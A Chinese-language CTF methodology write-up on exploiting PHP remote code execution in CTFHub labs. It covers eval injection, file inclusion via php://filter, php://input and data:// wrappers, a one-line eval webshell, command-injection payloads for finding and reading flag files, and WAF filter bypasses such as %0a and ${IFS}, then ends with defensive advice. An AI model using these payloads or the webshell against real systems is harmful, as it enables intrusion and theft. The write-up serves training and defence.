【微方法论】Web RCE 漏洞基础利用与 WAF 绕过手法小结（基于CTFHub）

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：Web安全 | 标签：RCE, 命令注入, 文件包含, WAF绕过, 微方法论

1. 简介与核心逻辑

RCE（Remote Code Execution，远程代码执行）漏洞的本质，是服务器在处理用户输入时，没有进行严格的过滤与隔离，导致用户输入的字符串被当作系统命令或代码执行。这通常是 Web 安全中危害最大的漏洞之一，可直接导致服务器被完全接管。

本次实战的核心攻击逻辑为：寻找注入点 -> 探测服务器环境（翻找） -> 绕过防御机制（黑名单） -> 读取目标文件（Flag）。

RCE 主要分为两大类：代码执行（如 PHP 的 eval()）和命令注入（如直接拼接 system("ping -c 4 {$ip}")）。文件包含漏洞（include()）虽属于代码执行，但往往需要借助 PHP 伪协议或 WebShell 来达成 RCE。

2. 常见利用场景与具体翻找代码

第一类：代码执行与文件包含（PHP 特性）

目标是通过恶意 PHP 代码获取服务器控制权，或直接读取敏感文件。

  • 直接代码执行（eval）：

    后端使用 eval($_REQUEST['cmd']);。输入必须是合法的 PHP 语句，且以分号结尾。

    // 探路与信息收集
?cmd=phpinfo();
// 执行系统命令
?cmd=system('ls /');
// 扫根目录（如果 system 被禁用）
?cmd=print_r(scandir('/'));
// 读取文件（绕过 system 禁用，防浏览器解析源码）
?cmd=echo file_get_contents('/flag');
?cmd=print_r(file_get_contents('/flag'));
  • 文件包含（Include）与伪协议组合：

    后端使用 include($_GET['file']);，允许包含各类伪协议。

    // 1. php://filter (读取源码, 防解析)
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=/flag

// 2. php://input (执行 POST 中的代码，需配合 Burp)
POST /?file=php://input HTTP/1.1
...


// 3. data:// (空投代码，无需公网 VPS)
?file=data://text/plain,
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7Pz4=

// 4. 包含本地木马（配合双参数绕过）
?file=shell.txt&ctfhub=system('cat /flag');
// 如果 file 参数被强制要求 php:// 开头，可改用以下方式包含本地 txt 木马
?file=php://filter/convert.base64-encode/resource=shell.txt // 不执行，仅读取
// 或者利用条件竞争/日志包含等其他姿势

第二类：命令注入（Linux Shell 特性）

后端直接拼接系统命令。当常规字符被 WAF 拦截时，我们需要打出“组合拳”来完成探测、搜索、读取的完整流程。

  • 【翻找阶段一：环境探测】 
    // 探测当前用户与系统
127.0.0.1; whoami
127.0.0.1; ls /
127.0.0.1; ls -la  // 注意查看文件大小，排除 0 字节或几十字节的干扰空壳文件

// 全盘搜索 flag 文件 (过滤系统伪文件报错)
127.0.0.1; find / -name "flag*" 2>/dev/null
127.0.0.1; find / -type f -name "flag*" -not -path "/sys/*" -not -path "/proc/*" 2>/dev/null

// 已知内容特征的全局搜索 (终极杀招，直接在代码内容中找 flag 字符串)
127.0.0.1; grep -rn "ctfhub" /var/www/html 2>/dev/null
  • 【翻找阶段二：读取尝试与排错】 
    // 基础读取
127.0.0.1; cat /flag
// 强制显示错误信息（排查文件不存在/无权限）
127.0.0.1; cat /flag 2>&1
// 查看环境变量（常被用作假 Flag 陷阱或真 Flag 藏匿点）
127.0.0.1; env
// 内存取证（查看进程崩溃残留的核心转储文件中的明文）
127.0.0.1; strings core.56 | grep -i flag
  • 【翻找阶段三：终极绕过组合拳】

    假设同时过滤了：;、空格、/、cat、flag。

    // 1. 绕过命令分隔符：使用 %0a (必须用 Burp Suite 发送，防二次编码)
127.0.0.1%0als
// 2. 绕过空格：${IFS} 或 <
127.0.0.1;cat${IFS}/flag
127.0.0.1;cat

3. 常用工具获取与说明

  • Burp Suite 社区版：RCE 实战的绝对核心。特别是在处理 %0a、%00 截断、修改 POST 请求体以及手动计算 Content-Length 时，浏览器地址栏会自作聪明地转义，只有 BP 的 Repeater 能完美发送原始字节流。
  • base64.us：在线解码工具（https://base64.us）。在读取 PHP 源码时，由于 <?php // ... ?> 会被浏览器当成 HTML 隐藏，必须通过 base64 命令强转后，用它还原。
  • 一句话木马（WebShell）：文件包含/命令注入的得力助手。标准形态：<?php eval($_REQUEST['ctfhub']);?>，通过参数传递 PHP 代码或系统命令。

4. 经验总结与避坑指南

核心法则：盲打排错三板斧！
当命令执行没有回显时，不要怀疑自己。第一板斧：加上 2>&1 重定向标准错误（注意检查 & 是否被过滤，被过滤则需换其他排错法）。第二板斧：用 ls -la 摸清目录结构和文件大小，排除空壳文件。第三板斧：遇到 .php 文件一律使用 base64 命令强制读取，防浏览器解析。
  • 不要主观臆测文件路径：不要一上来就盲猜 /flag 或 /flag/flag。务必通过 ls、find、grep 一步步探明目录结构（如遇到 flag_is_here 目录）。
  • 牢记 WAF 黑名单的漏网之鱼：过滤是不彻底的。它过滤了 cat，却可能漏了 tac；过滤了 ;，却漏了 %0a；过滤了 /，却漏了 ${PATH:0:1}。熟记那张“终极绕过对照表”能省下大量时间。
  • 警惕 PHP 的“隐身”特性：直接 cat 一个 PHP 文件时，如果里面包含 <?php ... ?>，PHP 解析器会直接执行代码或忽略注释，导致输出为空。这就是为什么我们要养成用 base64 读源码的习惯。
  • 本地测试与工具混合双打：在复杂 Payload 提交前，可以先在本地 Linux 环境或在线 PHP 沙盒测试命令拼接、通配符展开逻辑，确保语法无误后再发送到靶场。

5. 安全防御建议

  • 避免直接拼接系统命令与代码：坚决杜绝将用户输入直接拼接到 system()、exec()、eval() 中。如果必须调用系统命令，使用白名单验证参数（如限制 IP 格式），或使用语言内置的安全 API（如 PHP 的 escapeshellarg()）。
  • 限制文件包含功能：在 php.ini 中关闭危险的配置项，如 allow_url_include = Off 和 allow_url_fopen = Off，阻断 php://input 和 data:// 等伪协议的利用。
  • 禁用高风险函数与命令：在 PHP 配置中禁用 eval、system、exec、shell_exec 等危险函数。同时限制 Web 用户的系统权限，剥离上传目录的执行权限，确保即使被 RCE，攻击者也无法执行高危系统指令。
  • 严格的输入过滤与转义：对所有用户输入进行严格的特殊字符过滤（如 ;、|、&、$、` 等），并在输出时进行编码转义。
